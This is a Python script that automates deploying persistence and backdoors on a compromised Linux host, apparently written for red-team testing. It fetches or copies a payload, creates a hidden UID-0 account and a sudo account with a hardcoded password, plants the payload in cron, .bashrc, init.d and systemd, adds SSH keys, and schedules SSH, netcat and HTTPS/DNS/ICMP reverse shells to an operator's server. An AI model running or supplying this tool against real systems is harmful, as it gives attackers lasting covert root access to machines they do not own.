#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
########################################################################

.DEPENDENCES

- Operative system functions: crontab, bash,... 

.DESCRIPTION

Script for the automation of the deployment of persistence. 

It contains 3 different parts:

* Discovery of the machine
    - Checks its Internet access
    - Checks if there is a proxy configured
    - Checks if the process is elevated, to then check if the user is root or sudoer
* Persistence deployment
    - download file from the Internet
    - copy the file to another location
    - add user
    - crontab
    - init scripts (bashrc, init.d,...)
    - systemd
* Backdoor deployment
    - ssh  (reverse shell)
    - ssh auth keys
    - netcat (reverse shell)
    - reverse shell tool

Also it checks if a configuration file exists (named "config.json") 
 searching for different parameters in JSON format.

Finally it displays info about the processes and the results obtained

.PARAMETERS 

These are the possible actions this script can execute:
   - protocols: HTTPS, DNS, ICMP
   - techniques: checkRoot, adduser, crontab, init, service, sshShell, sshAuth, ncShell,
            toolHTTPS, toolDNS, toolICMP


########################################################################

"""

import os
from pathlib import Path        # to get path of the file
import json                     # read config file

import subprocess               # ping check
import requests                 # HTML check
import socket                   # DNS check
import getpass                  # User permissions

import urllib.request           # Download the payload from the internet
import shutil                   # To copy a file 
import stat                     # File permissions 
from datetime import datetime   # To get current date


##############################################################
### Init
##############################################################

###### Default values for variables ######

config = {
    # Environment variables 
    "envvars": {
        "userHome": os.path.expanduser('~') ,
        "userName": os.environ.get('USER') ,
        "scriptPath": str(Path(__file__).parent.resolve())
    },
    # Internet  config
    "discovery": {
        "pingTestIP": "8.8.8.8",
        "httpsTestUrl": "www.uclm.es",
        "proxy": ""
    },
    # Payload config
    "payload": {
        "name": "maltest.sh",
        "path": "",
        "URL": "",
        "pathToSave": "",    
        "preArguments": "",
        "postArguments": "",
        "output": " > /dev/null 2>&1"      
    },
    "persistence": {
        # Added user config
        "adduserName": "ftp2",
        "adduserPass": "linpassword",
        "adduserArgs": "-s /bin/bash", # without home
        # Cron config
        "cronjobTime": "@reboot",
        # Service config
        "serviceName": "servname",
        "serviceDesc": "Example service to test"
    },
    "backdoors":{
        # External server config
        "serverIPURL": "",
        "serverPort": "",
        "serverUser": "",
        # SSH config
        "sshAuthKey": "",
        # Commands for the backdoor tool
        "HTTPSCommand": "",
        "HTTPSCommandPreProxy":"",
        "HTTPSCommandPostProxy": "",
        "DNSCommand": "",
        "ICMPCommand": ""        
    },
    "preferences": {
        "excludedTechniques": [],
        "includedTechniques": [],
        "excludedProtocols": [],
        "forceProtocols": []
    }
}

config["payload"]["path"] = f'{config["envvars"]["scriptPath"]}/{config["payload"]["name"]}'
config["payload"]["pathToSave"] = f'{config["envvars"]["userHome"]}/{config["payload"]["name"]}'

###### Config file ######

CONFIG_FILE = f'{config["envvars"]["scriptPath"]}/config.json'


if (os.path.isfile(CONFIG_FILE)):

    with open(CONFIG_FILE) as configfile:
        loaded_config = json.load(configfile)
    
    for cat in loaded_config:
        if cat not in config:
            print (f'Config file: Unrecognized key "{cat}"')
        else:    
            for elem in loaded_config[cat]:
                if elem not in config[cat]:
                    print (f'Config file: Unrecognized key "{elem}"')
                else:
                    if str(loaded_config[cat][elem]).strip() : 
                        config[cat][elem] = loaded_config[cat][elem]

    

else:
    print("Cannot read the configuration file.\nExecution finished.\n")
    exit(0)

###### Final variables ######

USE_PAYLOAD = True

if not config["payload"]["name"] :
    if config["payload"]["path"] :
        config["payload"]["name"] = Path(config["payload"]["path"]).name
    elif config["payload"]["URL"]:
        config["payload"]["name"] = Path(config["payload"]["URL"]).name
    else:
        USE_PAYLOAD = False

if USE_PAYLOAD:
    if not config["payload"]["path"] :
        config["payload"]["path"] = f'{config["envvars"]["scriptPath"]}/{config["payload"]["name"]}'

    PAYLOAD_PATH = config["payload"]["path"]
    if config["payload"]["pathToSave"]:
        PAYLOAD_PATH = config["payload"]["pathToSave"]


    PAYLOAD_LAUNCH = PAYLOAD_PATH
    if config["payload"]["preArguments"]: PAYLOAD_LAUNCH = f'{config["payload"]["preArguments"]} {PAYLOAD_LAUNCH}'
    if config["payload"]["postArguments"]: PAYLOAD_LAUNCH += f' {config["payload"]["postArguments"]}'

    # Cron config
    CRONJOB = f'{config["persistence"]["cronjobTime"]}    {PAYLOAD_LAUNCH}'
    CRONJOB_ROOT = f'{config["persistence"]["cronjobTime"]}    root    {PAYLOAD_LAUNCH}\n'


###### Control variables ######

SEARCH_TECH = []


if ("HTTPS" not in config["preferences"]["excludedProtocols"]
    and ("HTTPS" in config["preferences"]["forceProtocols"]
    or config["backdoors"]["HTTPSCommand"] 
    or config["backdoors"]["HTTPSCommandPreProxy"])):
    SEARCH_TECH.append("HTTPS")

if ("DNS" not in config["preferences"]["excludedProtocols"]
    and ("DNS" in config["preferences"]["forceProtocols"]
    or config["backdoors"]["DNSCommand"])): 
    SEARCH_TECH.append("DNS")

if ("ICMP" not in config["preferences"]["excludedProtocols"]
    and ("ICMP" in config["preferences"]["forceProtocols"]
    or config["backdoors"]["ICMPCommand"])):  
    SEARCH_TECH.append("ICMP")


EXEC_TECH = ["checkRoot", "copyFile", "downloadFile", "adduser", "crontab", "init", "service", "sshShell", "sshAuth", 
"ncShell","toolHTTPS", "toolDNS", "toolICMP"]

if config["preferences"]["includedTechniques"]: EXEC_TECH = config["preferences"]["includedTechniques"]
EXEC_TECH = [x for x in EXEC_TECH if x not in config["preferences"]["excludedTechniques"]]

if not USE_PAYLOAD:
    EXCL_TECH = ["crontab", "copyFile", "downloadFile","init", "service", "toolHTTPS", "toolDNS", "toolICMP"]
    EXEC_TECH = [x for x in EXEC_TECH if x not in EXCL_TECH]


OTHER_EXCL_TECH = []

if not config["payload"]["pathToSave"]: OTHER_EXCL_TECH.append("copyFile")
if not config["payload"]["URL"]: OTHER_EXCL_TECH.append("downloadFile")

if (not config["backdoors"]["serverIPURL"]
    or not config["backdoors"]["serverPort"]):
    OTHER_EXCL_TECH.append("ncShell")
    OTHER_EXCL_TECH.append("sshShell")

elif not config["backdoors"]["serverUser"]:
    OTHER_EXCL_TECH.append("sshShell")

if not config["backdoors"]["sshAuthKey"]: OTHER_EXCL_TECH.append("sshAuth")

if not config["backdoors"]["HTTPSCommand"]: OTHER_EXCL_TECH.append("toolHTTPS")
if not config["backdoors"]["DNSCommand"]: OTHER_EXCL_TECH.append("toolDNS")
if not config["backdoors"]["ICMPCommand"]: OTHER_EXCL_TECH.append("toolICMP")

EXEC_TECH = [x for x in EXEC_TECH if x not in OTHER_EXCL_TECH]



###### Other functions ###### 

def change_message(boolvar):
    if boolvar:
        return "Successful"
    else:
        return "Failed"


##############################################################
### Discovery techniques
##############################################################

##### Internet access #####

def check_ping(ping_host):
    command = ['ping', '-c', '1', ping_host]
    
    try:
        output = subprocess.run(
            command, 
            text=True,
            stdout=subprocess.PIPE,
            check=True)

    except Exception:
        return False

    return True

def check_https(url_host, proxy):
    if proxy : 
        proxyDict = { proxy.split(":")[0] : proxy }

    try: 
        response= ""

        # checks if computer has https connection
        if proxy:
            response = requests.get("https://" + url_host, proxies=proxyDict)
        else:
            response = requests.get("https://" + url_host)    

        if response.status_code >= 200 and response.status_code < 400:
            return True
        else:
            return response.status
    except Exception:
        return False

def check_dns(url_host):
    try:
        socket.getaddrinfo(url_host, 25, socket.AF_INET, socket.SOCK_DGRAM)
        return True
    except socket.gaierror:
        return False


##### Check for proxy #####
# It only checks the environment variables related to proxy setups

def check_env_vars(variables):
    result = [] 
    for variable in variables:
        result.append(os.getenv(variable))
    return result

def check_proxy():
    proxy = ""

    proxy = [s or "" for s in check_env_vars(["http_proxy","HTTP_PROXY","ALL_PROXY","all_proxy"])]
    if not proxy :  proxy = [s or "" for s in check_env_vars(["no_proxy","NO_PROXY"])]
    if not proxy: return False

    return f"http://{proxy[0]}"


##### User/process permissions #####

def check_root():
    if os.geteuid() == 0:       # user is root
        #print("sudo")
        return True
    elif getpass.getuser() == "root":       # process running as root or sudo
        return True
    elif not all(v is None for v in check_env_vars(["SUDO_USER", "sudo_user", "SUDO_UID", "sudo_uid"])) :   # process running as sudo
        return True
    else:
        try:        # writing to /usr as only root or sudo can do it
            with open ("/usr/foonicular","a"):
                os.utime("/usr/foonicular", None)
            os.remove("/usr/foonicular")
            return True
        except PermissionError:
            #print("permissionError")
            return False
    return False


##############################################################
### Persistence techniques
##############################################################


##### Download file ##### 

def download_file(pay_url, pay_path):
    malfile = ""

    try:    
        with urllib.request.urlopen(pay_url) as payload:
            payfile = payload.read().decode('utf-8')

        with open(pay_path, "w") as file_object:
            file_object.write(payfile)

    except Exception:
        print("download file error")
        return False

    return True
    
       

##### Copy file to new location ##### 

def copy_file(origin_path, dest_path):
    ## The file is copied in another location and execution permissions are given

    # The following directories are temporary and usually writeable
    #   /var/tmp/
    #   /tmp/
    #   /dev/shm/

    try:
        newPath = shutil.copy(origin_path, dest_path)

        st = os.stat(dest_path)
        os.chmod(dest_path, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    except Exception:
        print("copy file error")
        return False

    return True



##### Configure crontab ##### 

def crontab_user(user_cron):

    crontab_command = f'(crontab -l 2>/dev/null; echo "{user_cron}") | crontab -'

    try:
        output = subprocess.run(crontab_command, shell=True, check=True, text=True)

    except Exception:
        print("crontab error")
        return False

    return True

def crontab_root(root_cron):
    # save in /etc/crontab

    try:
        with open("/etc/crontab", "a") as file_object:
            file_object.write(root_cron)

    except Exception:
        print("permissionError on crontab root")
        return False

    return True



##### init scripts: .bashrc, init.d ##### 

def init_user(user_home, pay_launch, pay_path, pay_name):

    try:
        with open(f'{user_home}/.bashrc', "a") as file_object:
            file_object.write(f'{pay_launch}\n')
    except Exception:
        print("bashrc error")
        return False

    return True

def init_root(pay_path, pay_name):
    copy_file(pay_path,f"/etc/init.d/{pay_name}")

    return True



##### Setting systemd service ##### 

def new_service_user(serv_name, serv_desc, pay_launch, user_home):
    service_file = f"[Unit]\nDescription={serv_desc}\n\n"
    service_file += f"[Service]\nType=simple\nExecStart={pay_launch}\n\n"
    service_file += f"[Install]\nWantedBy=multi-user.target\n"


    if not os.path.exists(f"{user_home}/.local/share/systemd"):
        os.makedirs(f"{user_home}/.local/share/systemd")

    if not os.path.exists(f"{user_home}/.local/share/systemd/user"):
        os.makedirs(f"{user_home}/.local/share/systemd/user")

    try:
        with open(f"{user_home}/.local/share/systemd/user/{serv_name}.service", "w") as file_object:
            file_object.write(service_file)

    except Exception:
        print("error on service user file creation")
        return False


    service_command = f'systemctl enable {serv_name}'

    try:
        output = subprocess.run(service_command, shell=True, check=True, text=True)

    except Exception:
        print("service user enable error")
        return False

    return True

def new_service_root(serv_name, serv_desc, pay_launch):
    service_file = f"[Unit]\nDescription={serv_desc}\n\n"
    service_file += f"[Service]\nType=simple\nExecStart={pay_launch}\nUser=root\n\n"
    service_file += f"[Install]\nWantedBy=multi-user.target\n"


    try:
        with open(f"/usr/lib/systemd/system/{serv_name}.service", "w") as file_object:
            file_object.write(service_file)

    except Exception:
        print("permissionError on service root file creation")
        return False


    service_command = f'systemctl enable {serv_name}'

    try:
        output = subprocess.run(service_command, shell=True, check=True, text=True)

    except Exception:
        print("service root enable error")
        return False

    return True



##### Creating new user ##### 

def new_user(adduser_args, adduser_name):
    user_command = f'useradd {adduser_args} {adduser_name}'

    try:
        output = subprocess.run(user_command, shell=True, check=True, text=True)

    except Exception:
        print("user error")
        return False

    return True

def new_privileged_user(adduser_args, adduser_name, adduser_passwd):
    privuser_command = f'useradd {adduser_args} {adduser_name} ;'
    privuser_command += f' usermod -aG sudo {adduser_name} ; echo "{adduser_passwd}" | passwd --stdin {adduser_name} '

    try:
        output = subprocess.run(privuser_command, shell=True, check=True, text=True)

    except Exception:
        print("privileged user error")
        return False

    return True    

def new_root_user(adduser_args, adduser_name, adduser_passwd):
    rootuser_command = f'useradd -ou 0 -g 0 {adduser_args} {adduser_name} ; echo "{adduser_passwd}" | passwd --stdin {adduser_name} '

    try:
        output = subprocess.run(rootuser_command, shell=True, check=True, text=True)

    except Exception:
        print("root user error")
        return False

    return True


##############################################################
### Backdoor techniques
# Reverse shell techniques are added to new crontab jobs
##############################################################


##### Tool reverse shell #####

def tool_generic_shell(cron_time, tool_command, is_root):
    
    if is_root: 
        final_tool_command = f'{cron_time}    root    {tool_command}'
        crontab_root(final_tool_command)
    else:
        final_tool_command = f'{cron_time}    {tool_command}'
        crontab_user(final_tool_command)

    return True


def tool_https_shell(proxy, https_command, https_command_pre, https_command_post, cron_time, is_root):

    tool_https_command = https_command

    if proxy:
        tool_https_command = f"{https_command_pre}{proxy}{https_command_post}"

    
    tool_generic_shell(cron_time, tool_https_command, is_root)

    return True

 
##### SSH related mechanisms ##### 

def ssh_reverse_shell(cron_time, is_root, server_ip, server_port, server_user):    

    ssh_revshell_command = f'ssh -f -N -T -R{server_port}:localhost:22 {server_user}@{server_ip}'

    tool_generic_shell(cron_time, ssh_revshell_command, is_root)

    return True

def ssh_auth_key(user_home, ssh_authkey):    

    if not os.path.exists(f"{user_home}/.ssh"):
        os.makedirs(f"{user_home}/.ssh")

    authkey_permission = f'chmod 700 {user_home}/.ssh; chmod 600 {user_home}/.ssh/authorized_keys'

    try:
        with open(f"{user_home}/.ssh/authorized_keys", "a") as file_object:
            file_object.write(ssh_authkey)

        output = subprocess.run(authkey_permission, shell=True, check=True, text=True)

    except Exception:
        print("error on authkeys user")
        return False


    return True


##### netcat reverse shell #####

def nc_reverse_shell(cron_time, is_root, server_ip, server_port):

    nc_commands = "rm -f /tmp/sysfifofile; mkfifo /tmp/sysfifofile;"
    nc_commands += f"cat /tmp/sysfifofile | /bin/bash -i 2>&1 | nc -l {server_ip} {server_port} > /tmp/sysfifofile"

    tool_generic_shell(cron_time, nc_commands, is_root)

    return True


##############################################################
### Main function
##############################################################

def main():

    print("\n#########################################")
    print(" ## Persistence deployment automation ## ")
    print("#########################################\n")


    ##### Variables ##### 

    proxy = False
    has_https = False
    has_dns = False
    has_ping = False
    
    is_root = False

   
    ##### Discovery #####

    print("* Discovery")   

    if "HTTPS" in SEARCH_TECH: 
        if not config["discovery"]["proxy"] : config["discovery"]["proxy"] = check_proxy()
        has_https = check_https(config["discovery"]["httpsTestUrl"], config["discovery"]["proxy"])

        print(f'- Has proxy: {config["discovery"]["proxy"]}')
        print(f"- Has HTTPS connection: {has_https}")

    if "DNS" in SEARCH_TECH: 
        has_dns = check_dns(config["discovery"]["httpsTestUrl"])
        print(f"- Has DNS connection: {has_dns}")

    if "ICMP" in SEARCH_TECH: 
        has_ping = check_ping(config["discovery"]["pingTestIP"])
        print(f"- Has ICMP connection: {has_ping}")

    if "checkRoot" in EXEC_TECH:
        is_root = check_root()
        print(f"- Process elevated: {is_root}")


    ##### Persistence and backdoors #####

    print("\n* Applied techniques:")

    if "downloadFile" in EXEC_TECH:
        downloaded_file = download_file(config["payload"]["URL"], PAYLOAD_PATH)
        print(f'- File downloaded to path "{PAYLOAD_PATH}": {change_message(downloaded_file)}')

    if "copyFile" in EXEC_TECH:
        file_copied = copy_file(config["payload"]["path"], config["payload"]["pathToSave"])
        print(f'- File copied to path "{PAYLOAD_PATH}": {change_message(file_copied)}')

    if is_root:

        if "adduser" in EXEC_TECH:
            adding_user = new_root_user(config["persistence"]["adduserArgs"], config["persistence"]["adduserName"], config["persistence"]["adduserPass"] )
            print(f'- User "{config["persistence"]["adduserName"]}" created as root user: {change_message(adding_user)}')

            new_priv_user = new_privileged_user(config["persistence"]["adduserArgs"], f'{config["persistence"]["adduserName"]}2', config["persistence"]["adduserPass"])
            print(f'- User "{config["persistence"]["adduserName"]}2" created as privileged user: {change_message(new_priv_user)}')

        if "crontab" in EXEC_TECH:
            new_job = crontab_root(CRONJOB_ROOT)
            print(f'- Cronjob running as root created: {change_message(new_job)}')

        if "init" in EXEC_TECH:
            added_init = init_root(PAYLOAD_PATH, config["payload"]["name"]) 
            print(f'- init root (init.d): {change_message(added_init)}')

        if "service" in EXEC_TECH:
            added_service = new_service_root(config["persistence"]["serviceName"], config["persistence"]["serviceDesc"], PAYLOAD_LAUNCH) 
            print(f'- Added service running as root named "{config["persistence"]["serviceName"]}": {change_message(added_service)}')
    else:

        if "adduser" in EXEC_TECH:
            adding_user = new_user(config["persistence"]["adduserArgs"], config["persistence"]["adduserName"])
            print(f'- User "{ADDUSER_NAME}" created: {change_message(adding_user)}')

        if "crontab" in EXEC_TECH:
            new_job = crontab_user(CRONJOB)
            print(f'- Cronjob created: {change_message(new_job)}')

        if "init" in EXEC_TECH:
            added_init = init_user(config["envvars"]["userHome"], PAYLOAD_LAUNCH, PAYLOAD_PATH, config["payload"]["name"]) 
            print(f'- init user (.bashrc): {change_message(added_init)}')

        if "service" in EXEC_TECH:
            added_service = new_service_user(config["persistence"]["serviceName"], config["persistence"]["serviceDesc"], PAYLOAD_LAUNCH, config["envvars"]["userHome"]) 
            print(f'- Added service named "{config["persistence"]["serviceName"]}": {change_message(added_service)}')
        
    
    if "sshShell" in EXEC_TECH:
        cron_ssh = ssh_reverse_shell(config["persistence"]["cronjobTime"], is_root, 
            config["backdoors"]["serverIPURL"], config["backdoors"]["serverPort"], config["backdoors"]["serverUser"]) 
        print(f'- Added a SSH reverse shell as a cronjob: {change_message(cron_ssh)}')

    if "sshAuth" in EXEC_TECH:
        authkey_copied = ssh_auth_key(config["envvars"]["userHome"], config["backdoors"]["sshAuthKey"]) 
        print(f'- Copied the public key on the user "{config["envvars"]["userName"]}": {change_message(authkey_copied)}')    

    if "ncShell" in EXEC_TECH:
        cron_nc = nc_reverse_shell(config["persistence"]["cronjobTime"], is_root, config["backdoors"]["serverIPURL"], config["backdoors"]["serverPort"]) 
        print(f'- Added a netcat reverse shell as a cronjob: {change_message(cron_nc)}')  

    if "toolHTTPS" in EXEC_TECH and has_https:
        cron_http = tool_https_shell(config["discovery"]["proxy"], config["backdoors"]["HTTPSCommand"], 
            config["backdoors"]["HTTPSCommandPreProxy"], config["backdoors"]["HTTPSCommandPostProxy"], 
            config["persistence"]["cronjobTime"], is_root) 
        print(f'- Added a reverse shell via HTTPS as a cronjob: {change_message(cron_http)}')  

    if "toolDNS" in EXEC_TECH and has_dns:
        cron_dns = tool_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["DNSCommand"], is_root) 
        print(f'- Added a reverse shell via DNS as a cronjob: {change_message(cron_dns)}')  

    if "toolICMP" in EXEC_TECH and has_ping:
        cron_icmp = tool_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["ICMPCommand"], is_root) 
        print(f'- Added a reverse shell via ICMP as a cronjob: {change_message(cron_icmp)}')  
 
    print(f"\n Finished at {datetime.today().strftime('%H:%M:%S on %d/%m/%Y')}")


if __name__ == "__main__":
    main()
